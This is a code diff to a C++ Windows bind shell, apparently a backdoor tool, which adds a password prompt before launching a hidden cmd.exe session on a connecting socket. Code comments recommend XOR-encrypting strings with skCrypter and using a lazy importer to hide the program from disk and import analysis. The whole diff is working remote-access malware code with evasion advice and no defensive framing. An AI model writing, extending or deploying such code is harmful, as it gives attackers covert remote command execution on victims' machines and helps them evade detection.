@@ -12,10 +12,49 @@ BindShell::~BindShell()
     WSACleanup();
 }
 
+BOOL BindShell::BingusAuthorize(SOCKET clientSocket)
+{
+    const char* ask = "PWD: ";
+    const char* allow = "yea";
+    const char* deny = "nah";
+
+    char recvPwd[1024] = { 0 };
+
+    send(clientSocket, ask, strlen(ask), 0);
+
+    int bytesRecv = recv(clientSocket, recvPwd, sizeof(recvPwd), 0);
+    if (bytesRecv <= 0)
+        return false;
+
+    /*
+     * these strings can be XOR encrypted using something like skCrypter
+     * https://github.com/skadro-official/skCrypter
+     * would prevent anyone from finding the passwd on disc (wont help if dumped from memory)
+     * 
+     * also unrelated but maybe smth like a lazy loader would help hide even moar
+     * https://github.com/JustasMasiulis/lazy_importer
+     * 
+     * instead the password is gonna be the same as our accept output LOL
+    */
+    if (std::string(recvPwd, bytesRecv).find(allow) != -1)
+    {
+        send(clientSocket, allow, strlen(allow), 0);
+        return true;
+    }
+    else 
+    {
+        send(clientSocket, deny, strlen(deny), 0);
+        return false;
+    }
+}
+
 DWORD APIENTRY BindShell::BingusSessionHandler(LPVOID lpParameter)
 {
     SOCKET clientSocket = (SOCKET)lpParameter;
-    RunCmdBindShell((LPWSTR)L"cmd.exe", (HANDLE)clientSocket, true, CREATE_NO_WINDOW);
+
+    if (BingusAuthorize(clientSocket))
+        RunCmdBindShell((LPWSTR)L"cmd.exe", (HANDLE)clientSocket, true, CREATE_NO_WINDOW);
+
     closesocket(clientSocket);
 
     return 0;
